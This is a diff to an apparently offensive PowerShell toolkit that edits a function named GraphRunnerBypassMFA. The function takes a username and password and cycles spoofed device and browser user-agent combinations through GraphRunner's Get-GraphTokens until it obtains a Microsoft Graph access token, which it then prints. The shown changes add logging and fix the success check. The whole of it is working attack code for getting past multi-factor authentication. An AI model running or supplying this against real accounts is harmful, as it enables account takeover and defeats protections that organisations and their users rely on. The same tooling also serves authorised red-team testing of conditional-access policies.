@@ -2079,10 +2079,13 @@ function SetNewSecretForServicePrincipal {
 function GraphRunnerBypassMFA {
     Clear-Host
     DisplayHeader
-    Write-Host "Testing Forge User Agent Combinations to get Graph Access Token via Dafthack's Graphrunner" -ForegroundColor Cyan
+    Write-Host "Testing User Agent Combinations to bypass MFA to get Graph Access Token via Dafthack's Graphrunner" -ForegroundColor Cyan
     $username = Read-Host -Prompt "Username"
     $password = Read-Host -Prompt "Password"
 
+    # Reset global token variable
+    $global:tokens = $null
+    
     # Define the device and browser combinations
     $devices = @('Mac', 'Windows', 'AndroidMobile', 'iPhone')
     $browsers = @('Android', 'IE', 'Chrome', 'Firefox', 'Edge', 'Safari')
@@ -2091,18 +2094,22 @@ function GraphRunnerBypassMFA {
     :OuterLoop foreach ($device in $devices) {
         foreach ($browser in $browsers) {
             try {
+                Write-Host "Attempting with Device: $device, Browser: $browser" -ForegroundColor Cyan
+                
                 # Attempt to acquire graph tokens using the generated user agent
                 $result = Get-GraphTokens -UserPasswordAuth -Device $device -Browser $browser
-                if ($result) {
-                    Write-Host "Successful access token retrieved with $device and $browser combination:" -ForegroundColor Green
-                    Write-Host "Access Token: $($global:tokens.access_token)" -ForegroundColor Green
+                
+                # Checking if the global variable $tokens has been set
+                if ($global:tokens -and $global:tokens.access_token) {
+                    Write-Host "Successful access token retrieved with $device and $browser combination:" -ForegroundColor DarkGreen
+                    Write-Host "Access Token: $($global:tokens.access_token)" -ForegroundColor DarkMagenta
                     break OuterLoop  # Exit both loops if a token is retrieved
                 } else {
                     Write-Host "Failed to retrieve token with $device and $browser combination" -ForegroundColor Red
                 }
             }
             catch {
-                Write-Host "Error with $device and $browser combination: $_" -ForegroundColor Red
+                Write-Host "Error with Device: $device, Browser: $browser | Error: $($_.Exception.Message)" -ForegroundColor Red
             }
         }
     }
